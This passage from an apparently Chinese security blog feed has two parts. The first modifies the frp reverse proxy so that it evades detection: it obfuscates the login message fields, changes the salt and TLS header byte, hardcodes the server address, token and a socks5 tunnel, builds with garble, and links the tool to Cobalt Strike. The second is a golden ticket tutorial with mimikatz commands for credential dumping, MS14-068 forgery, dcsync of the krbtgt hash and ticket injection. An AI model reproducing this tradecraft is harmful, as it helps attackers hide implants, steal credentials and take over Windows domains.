class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nix">myproject<span class="hljs-symbol">/</span><br>├── cmd<span class="hljs-symbol">/</span>              <span class="hljs-comment"># 应用的入口，main 函数所在位置</span><br>│   └── myapp<span class="hljs-symbol">/</span><br>│       └── main.go   <span class="hljs-comment"># 入口文件，包含 package main 和 func main</span><br>├── pkg<span class="hljs-symbol">/</span>              <span class="hljs-comment"># 可复用的代码库</span><br>│   └── mypackage<span class="hljs-symbol">/</span><br>│       ├── mycode.go<br>│       └── util.go<br>├── internal<span class="hljs-symbol">/</span>         <span class="hljs-comment"># 私有代码库，仅在项目内部可用</span><br>│   └── someinternal<span class="hljs-symbol">/</span><br>├── go.mod            <span class="hljs-comment"># 模块配置文件</span><br>└── README.md<br></code></pre></td></tr></table></figure><p>![CleanShot 2025-01-24 at 01.18.40@2x](..&#x2F;image&#x2F;正反向代理总结&#x2F;CleanShot 2025-01-24 at <a href="mailto:&#48;&#49;&#46;&#x31;&#56;&#46;&#x34;&#48;&#64;&#50;&#x78;&#x2e;&#x70;&#x6e;&#103;">01.18.40@2x.png</a>)</p><p>![CleanShot 2025-01-24 at 01.21.38@2x](..&#x2F;image&#x2F;正反向代理总结&#x2F;CleanShot 2025-01-24 at <a href="mailto:&#48;&#49;&#46;&#50;&#49;&#x2e;&#51;&#x38;&#64;&#50;&#120;&#46;&#112;&#110;&#x67;">01.21.38@2x.png</a>)</p><p>![CleanShot 2025-01-24 at 01.44.21@2x](..&#x2F;image&#x2F;正反向代理总结&#x2F;CleanShot 2025-01-24 at <a href="mailto:&#48;&#49;&#x2e;&#52;&#x34;&#46;&#50;&#49;&#64;&#50;&#120;&#x2e;&#112;&#x6e;&#103;">01.44.21@2x.png</a>)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runClient</span><span class="hljs-params">(cfgFilePath <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>cfg, pxyCfgs, visitorCfgs, err := config.ParseClientConfig(cfgFilePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">return</span> startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)<br>&#125;<br></code></pre></td></tr></table></figure><p>![CleanShot 2025-01-24 at 01.48.43@2x](..&#x2F;image&#x2F;正反向代理总结&#x2F;CleanShot 2025-01-24 at <a href="mailto:&#x30;&#49;&#x2e;&#52;&#x38;&#x2e;&#52;&#x33;&#x40;&#50;&#x78;&#x2e;&#x70;&#x6e;&#x67;">01.48.43@2x.png</a>)</p><h4 id="删除特征"><a href="#删除特征" class="headerlink" title="删除特征"></a>删除特征</h4><ul><li>frp&#x2F;pkg&#x2F;msg&#x2F;msg.go</li></ul><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">type</span> <span class="hljs-keyword">Login</span> struct &#123;<br><span class="hljs-keyword">Version</span>      string            `<span class="hljs-type">json</span>:&quot;wdadawdawdwada&quot;`<br>Hostname     string            `<span class="hljs-type">json</span>:&quot;dfadfawfawfaw&quot;`<br>Os           string            `<span class="hljs-type">json</span>:&quot;dwaawdawdawd&quot;`<br>Arch         string            `<span class="hljs-type">json</span>:&quot;fesgfdrgredg&quot;`<br><span class="hljs-keyword">User</span>         string            `<span class="hljs-type">json</span>:&quot;dwadawdawdawd&quot;`<br>PrivilegeKey string            `<span class="hljs-type">json</span>:&quot;htftjyujy&quot;`<br><span class="hljs-type">Timestamp</span>    int64             `<span class="hljs-type">json</span>:&quot;dwadfafrhyjyugkuyk&quot;`<br>RunID        string            `<span class="hljs-type">json</span>:&quot;ghrfthytgjyuj&quot;`<br>Metas        map[string]string `<span class="hljs-type">json</span>:&quot;gergrtghtgf&quot;`<br><br>// <span class="hljs-keyword">Some</span> <span class="hljs-keyword">global</span> configures.<br>PoolCount <span class="hljs-type">int</span> `<span class="hljs-type">json</span>:&quot;pool_count,omitempty&quot;`<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>frp&#x2F;client&#x2F;service.go</li></ul><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs dts">loginMsg := <span class="hljs-variable">&amp;msg</span>.Login<span class="hljs-punctuation">&#123;</span><br><span class="hljs-symbol">Arch:</span>      <span class="hljs-string">&quot;qwq&quot;</span>,<br><span class="hljs-symbol">Os:</span>        <span class="hljs-string">&quot;sys&quot;</span>,<br><span class="hljs-symbol">PoolCount:</span> <span class="hljs-number">1</span>,<br><span class="hljs-symbol">User:</span>      <span class="hljs-string">&quot;a&quot;</span>,<br><span class="hljs-symbol">Version:</span>   version.Full(),<br><span class="hljs-symbol">Timestamp:</span> time.Now().Unix(),<br><span class="hljs-symbol">RunID:</span>     svr.runID,<br><span class="hljs-symbol">Metas:</span>     nil<br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>​修改默认salt</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">func <span class="hljs-built_in">init</span>() &#123;<br>crypto<span class="hljs-selector-class">.DefaultSalt</span> = <span class="hljs-string">&quot;lolydawn&quot;</span><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> remove this when we drop support for go1.19</span><br>rand<span class="hljs-selector-class">.Seed</span>(<span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Now</span>()<span class="hljs-selector-class">.UnixNano</span>())<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>cmd&#x2F;frps&#x2F;main.go</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">func <span class="hljs-selector-tag">main</span>() &#123;<br>crypto<span class="hljs-selector-class">.DefaultSalt</span> = <span class="hljs-string">&quot;lolydawn&quot;</span><br><span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> remove this when we drop support for go1.19</span><br>rand<span class="hljs-selector-class">.Seed</span>(<span class="hljs-selector-tag">time</span><span class="hljs-selector-class">.Now</span>()<span class="hljs-selector-class">.UnixNano</span>())<br><br><span class="hljs-built_in">Execute</span>()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>修改tls特征</li></ul><p>frp&#x2F;pkg&#x2F;util&#x2F;net&#x2F;tls.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> FRPTLSHeadByte <span class="hljs-type">int</span><span class="hljs-comment">//动态生成</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>    FRPTLSHeadByte, err = GenerateRandomByte()<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Sprintf(<span class="hljs-string">&quot;Failed to generate random byte: %v&quot;</span>, err)<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">GenerateRandomByte</span><span class="hljs-params">()</span></span> (<span class="hljs-type">int</span>, <span class="hljs-type">error</span>) &#123;<br>    n, err := rand.Int(rand.Reader, big.NewInt(<span class="hljs-number">0x90</span>))<br>    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>, err<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-type">int</span>(n.Int64()) + <span class="hljs-number">0x50</span>, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>版本号修改</li></ul><p>&#x2F;pkg&#x2F;util&#x2F;version&#x2F;version.go</p><ul><li>打印日志去除</li></ul><h4 id="功能修改"><a href="#功能修改" class="headerlink" title="功能修改"></a>功能修改</h4><ul><li>增加命令行参数</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">func <span class="hljs-built_in">init</span>() &#123;<br>rootCmd<span class="hljs-selector-class">.PersistentFlags</span>()<span class="hljs-selector-class">.StringVarP</span>(&amp;cfgFile, <span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;config file of frpc&quot;</span>)<br>rootCmd<span class="hljs-selector-class">.PersistentFlags</span>()<span class="hljs-selector-class">.StringVarP</span>(&amp;cfgDir, <span class="hljs-string">&quot;config_dir&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;config directory, run one frpc service for each file in config directory&quot;</span>)<br>rootCmd<span class="hljs-selector-class">.PersistentFlags</span>()<span class="hljs-selector-class">.BoolVarP</span>(&amp;showVersion, <span class="hljs-string">&quot;version&quot;</span>, <span class="hljs-string">&quot;v&quot;</span>, false, <span class="hljs-string">&quot;version of frpc&quot;</span>)<br>rootCmd<span class="hljs-selector-class">.PersistentFlags</span>()<span class="hljs-selector-class">.StringVarP</span>(&amp;rootServerAddr, <span class="hljs-string">&quot;rootServerAddr&quot;</span>, <span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;192.168.13.128&quot;</span>, <span class="hljs-string">&quot;rootServerAddr&quot;</span>)<br>rootCmd<span class="hljs-selector-class">.PersistentFlags</span>()<span class="hljs-selector-class">.IntVarP</span>(&amp;rootServerPort, <span class="hljs-string">&quot;rootServerPort&quot;</span>, <span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-number">7777</span>, <span class="hljs-string">&quot;rootServerPort&quot;</span>)<br>rootCmd<span class="hljs-selector-class">.PersistentFlags</span>()<span class="hljs-selector-class">.StringVarP</span>(&amp;roottoken, <span class="hljs-string">&quot;roottoken&quot;</span>, <span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;vw50kfc&quot;</span>, <span class="hljs-string">&quot;roottoken&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>传参需要对应修改</p><p>修改runClitent参数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">runClient</span><span class="hljs-params">(cfgFilePath <span class="hljs-type">string</span>, rootServerAddr <span class="hljs-type">string</span>, rootServerPort <span class="hljs-type">int</span>, roottoken <span class="hljs-type">string</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>cfg, pxyCfgs, visitorCfgs, err := config.ParseClientConfig(cfgFilePath)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(err)<br><span class="hljs-keyword">return</span> err<br>&#125;<br><span class="hljs-keyword">if</span> cfgFilePath == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">if</span> rootServerAddr != <span class="hljs-string">&quot;&quot;</span> &#123;<br>&#125;<br>cfg.ServerAddr = rootServerAddr<br>cfg.ServerPort = rootServerPort<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">return</span> err<br>&#125;<br><br><span class="hljs-keyword">if</span> roottoken != <span class="hljs-string">&quot;&quot;</span> &#123;<br>cfg.Token = roottoken<br>&#125;<br><span class="hljs-keyword">return</span> startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)<br>&#125;<br></code></pre></td></tr></table></figure><p>跟踪ParseClientConfig函数进行修改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ParseClientConfig</span><span class="hljs-params">(filePath <span class="hljs-type">string</span>)</span></span> (<br>cfg ClientCommonConf,<br>pxyCfgs <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]ProxyConf,<br>visitorCfgs <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]VisitorConf,<br>err <span class="hljs-type">error</span>,<br>) &#123;<br><span class="hljs-keyword">var</span> content []<span class="hljs-type">byte</span><br><span class="hljs-keyword">if</span> filePath == <span class="hljs-string">&quot;&quot;</span>&#123;<br>    content , err = GetRenderedConfFromDefaultConf()<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    content , err = GetRenderedConfFromFile(filePath)<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>configBuffer := bytes.NewBuffer(<span class="hljs-literal">nil</span>)<br>configBuffer.Write(content)<br><br><span class="hljs-comment">// Parse common section.</span><br>cfg, err = UnmarshalClientConfFromIni(content)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>cfg.Complete()<br><span class="hljs-keyword">if</span> err = cfg.Validate(); err != <span class="hljs-literal">nil</span> &#123;<br>err = fmt.Errorf(<span class="hljs-string">&quot;parse config error: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><br><span class="hljs-comment">// Aggregate proxy configs from include files.</span><br><span class="hljs-keyword">var</span> buf []<span class="hljs-type">byte</span><br>buf, err = getIncludeContents(cfg.IncludeConfigFiles)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>err = fmt.Errorf(<span class="hljs-string">&quot;getIncludeContents error: %v&quot;</span>, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>configBuffer.WriteString(<span class="hljs-string">&quot;\n&quot;</span>)<br>configBuffer.Write(buf)<br><br><span class="hljs-comment">// Parse all proxy and visitor configs.</span><br>pxyCfgs, visitorCfgs, err = LoadAllProxyConfsFromIni(cfg.User, configBuffer.Bytes(), cfg.Start)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><p>pkg&#x2F;config&#x2F;value.go</p><p>到该路径新建一个函数 存放默认的conf proxy配置</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stylus">func <span class="hljs-built_in">GetRenderedConfFromDefaultConf</span>() (out <span class="hljs-selector-attr">[]</span>byte, err error) &#123;<br><br><span class="hljs-selector-tag">b</span> := bytes<span class="hljs-selector-class">.NewBuffer</span>(nil)<br><br><span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.WriteString</span>(`<span class="hljs-selector-attr">[common]</span><br><br><span class="hljs-selector-attr">[socks5]</span><br>type = tcp<br>remote_port = <span class="hljs-number">12345</span><br>plugin = socks5`)<br><br><br><br>out, err = <span class="hljs-built_in">RenderContent</span>(<span class="hljs-selector-tag">b</span><span class="hljs-selector-class">.Bytes</span>())<br>return<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="其余功能"><a href="#其余功能" class="headerlink" title="其余功能"></a>其余功能</h4><ul><li>删除配置文件</li><li>联动cs插件</li><li>钉钉、飞书消息</li><li>随机账密生成</li></ul><h4 id="混淆编译"><a href="#混淆编译" class="headerlink" title="混淆编译"></a>混淆编译</h4><ul><li>正常编译</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros">@echo off<br>setlocal<br><br><span class="hljs-built_in">set</span> <span class="hljs-attribute">CGO_ENABLED</span>=0<br><span class="hljs-built_in">set</span> <span class="hljs-attribute">GOARCH</span>=amd64<br><br>:: <span class="hljs-built_in">Set</span> environment <span class="hljs-keyword">for</span> Windows build<br><span class="hljs-built_in">set</span> <span class="hljs-attribute">GOOS</span>=windows<br><br>:: Build <span class="hljs-keyword">for</span> Windows<br>go build -trimpath -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> <span class="hljs-attribute">-buildvcs</span>=<span class="hljs-literal">false</span> -o bin\frps.exe .\cmd\frps<br>go build -trimpath -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> <span class="hljs-attribute">-buildvcs</span>=<span class="hljs-literal">false</span> -o bin\frpc.exe .\cmd\frpc<br><br>:: <span class="hljs-built_in">Set</span> environment <span class="hljs-keyword">for</span> Linux build<br><span class="hljs-built_in">set</span> <span class="hljs-attribute">GOOS</span>=linux<br><br>:: Build <span class="hljs-keyword">for</span> Linux<br>go build -trimpath -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> <span class="hljs-attribute">-buildvcs</span>=<span class="hljs-literal">false</span> -o bin/frps .\cmd\frps<br>go build -trimpath -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> <span class="hljs-attribute">-buildvcs</span>=<span class="hljs-literal">false</span> -o bin/frpc .\cmd\frpc<br><br>endlocal<br>pause<br></code></pre></td></tr></table></figure><ul><li>混淆编译</li></ul><p>go install mvdan.cc&#x2F;garble@latest</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs routeros">@echo off<br>setlocal<br><br><span class="hljs-built_in">set</span> <span class="hljs-attribute">CGO_ENABLED</span>=0<br><span class="hljs-built_in">set</span> <span class="hljs-attribute">GOARCH</span>=amd64<br><br>:: <span class="hljs-built_in">Set</span> environment <span class="hljs-keyword">for</span> Windows build<br><span class="hljs-built_in">set</span> <span class="hljs-attribute">GOOS</span>=windows<br><br>:: Build <span class="hljs-keyword">for</span> Windows<br>garble build -trimpath -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> <span class="hljs-attribute">-buildvcs</span>=<span class="hljs-literal">false</span> -o bin\frps.exe .\cmd\frps<br>garble build -trimpath -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> <span class="hljs-attribute">-buildvcs</span>=<span class="hljs-literal">false</span> -o bin\frpc.exe .\cmd\frpc<br><br>:: Copy frpc.exe <span class="hljs-keyword">to</span> cs_frp_plugin directory<br>copy bin\frpc.exe cs_frp_plugin\frpc.exe<br><br>:: <span class="hljs-built_in">Set</span> environment <span class="hljs-keyword">for</span> Linux build<br><span class="hljs-built_in">set</span> <span class="hljs-attribute">GOOS</span>=linux<br><br>:: Build <span class="hljs-keyword">for</span> Linux<br>garble build -trimpath -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> <span class="hljs-attribute">-buildvcs</span>=<span class="hljs-literal">false</span> -o bin/frps .\cmd\frps<br>garble build -trimpath -ldflags <span class="hljs-string">&quot;-s -w&quot;</span> <span class="hljs-attribute">-buildvcs</span>=<span class="hljs-literal">false</span> -o bin/frpc .\cmd\frpc<br><br>endlocal<br>pause<br></code></pre></td></tr></table></figure><h4 id="签名伪造"><a href="#签名伪造" class="headerlink" title="签名伪造"></a>签名伪造</h4><h4 id="图标修改"><a href="#图标修改" class="headerlink" title="图标修改"></a>图标修改</h4><h4 id="特征去除"><a href="#特征去除" class="headerlink" title="特征去除"></a>特征去除</h4><h4 id="vt对比"><a href="#vt对比" class="headerlink" title="vt对比"></a>vt对比</h4><p><img src="/../image/%E6%AD%A3%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%80%BB%E7%BB%93/image-20250113143820835.png" alt="image-20250113143820835"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://zhuanlan.zhihu.com/p/464965616">https://zhuanlan.zhihu.com/p/464965616</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>金票银票总结</title>
    <link href="/2024/12/12/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8%E6%80%BB%E7%BB%93/"/>
    <url>/2024/12/12/%E9%87%91%E7%A5%A8%E9%93%B6%E7%A5%A8%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="黄金票据和白银票据"><a href="#黄金票据和白银票据" class="headerlink" title="黄金票据和白银票据"></a>黄金票据和白银票据</h1><h2 id="金票Golden-ticket"><a href="#金票Golden-ticket" class="headerlink" title="金票Golden ticket"></a>金票Golden ticket</h2><p>原理</p><ul><li>在kerberos认真中，client通过as认证后，拿到了一个logon session key 和tgt</li><li>而logon session key并不会保存在kdc中</li><li>krbtgt的ntlm hash又是固定的 所以只要拿到krbtgt的ntlm hash就可以伪造tgt和logon session key从而进行下一步与tgs的交互</li><li>有了金票后，就跳过as验证，不用验证账户和密码，所以也不用担心域管理员密码修改</li></ul><p>特点</p><ul><li>不需要和as进行交互，需要krbtgt的hash</li></ul><h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>一、伪造凭据，提升域内普通用户的权限</p><ul><li><p>本地administrator用户登录域内的一个主机</p></li><li><p>net config workstation拿到域名</p></li><li><p>nltest &#x2F;dsgetdc:域名 拿到dc主机名</p></li><li><p>上传mimikatz,以管理员权限运行CMD,再去执行mimikatz</p></li><li><pre><code class="hljs">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;&gt;log.txt<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">- </span>拿到域内用户名和密码<br><br><span class="hljs-bullet">- </span>登陆域账号<br><br><span class="hljs-bullet">- </span>尝试提权 域内普通用户提权成功后是有时效性的<br><br><span class="hljs-bullet">- </span>whoami /user 或者 whoami/all 查看该域用户的suid<br><br><span class="hljs-bullet">- </span>上传mimikatz和MS-068提权工具<br><br><span class="hljs-bullet">- </span>使用MS14-068伪造票据，会在当前目录下生成一个凭证<br><br><span class="hljs-bullet">- </span><span class="hljs-code">```</span><br><span class="hljs-code">  ms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址 </span><br></code></pre></td></tr></table></figure></code></pre></li><li><p>使用mimikatz清空之前缓存的凭证，导入伪造的凭证</p></li><li><pre><code class="hljs">mimikatz # kerberos::purge  //清空票据mimikatz # kerberos::ptc 票据文件地址<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><br><span class="hljs-bullet">- </span>然后拿到域管的权限<br><br>二、伪造金票<br><br>条件<br><br><span class="hljs-bullet">- </span>域名称<br><span class="hljs-bullet">- </span>域的SID值<br><span class="hljs-bullet">- </span>域的KRBTGT账号的HASH<br><span class="hljs-bullet">- </span>伪造任意用户名<br><br>mimikatz导出krbtgt的hash<br><br></code></pre></td></tr></table></figure>mimikatz(commandline) # privilege::debugmimikatz(commandline) # lsadump::dcsync /domain:cyberpeace.com /all /csvmimikatz(commandline) # lsadump::dcsync /domain:cyberpeace.com /user:krbtgt</code></pre></li></ul><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><br>![image<span class="hljs-number">-20241128152659240</span>](../image/SQL注入总结/image<span class="hljs-number">-20241128152659240.</span>png)<br><br>之后可以看到krbtgt用户的SID<br><br></code></pre></td></tr></table></figure><p>mimikatz.exe “kerberos::golden &#x2F;admin:system &#x2F;domain:cyberpeace.com &#x2F;sid:S-1-5-21-97341123-1865264218-933115267 &#x2F;krbtgt:95972cdf7b8dde854e74c1871f6d80a0 &#x2F;ticket:ticket.kirbi” exit</p><p>&#x2F;admin：伪造的用户名<br>&#x2F;domain：域名称<br>&#x2F;sid：SID值，注意是去掉最后一个-后面的值<br>&#x2F;krbtgt：krbtgt的HASH值<br>&#x2F;ticket：生成的票据名称    &#x2F;&#x2F;不是写入内存中的命令！</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><br>金票的使用<br><br>登陆普通用户，通过mimikatz的kerberos::ptt功能将ticket.kirbi导入内存中<br><br></code></pre></td></tr></table></figure><p>mimikatz # kerberos::purge<br>mimikatz # kerberos::ptt ticket.kirbi</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code 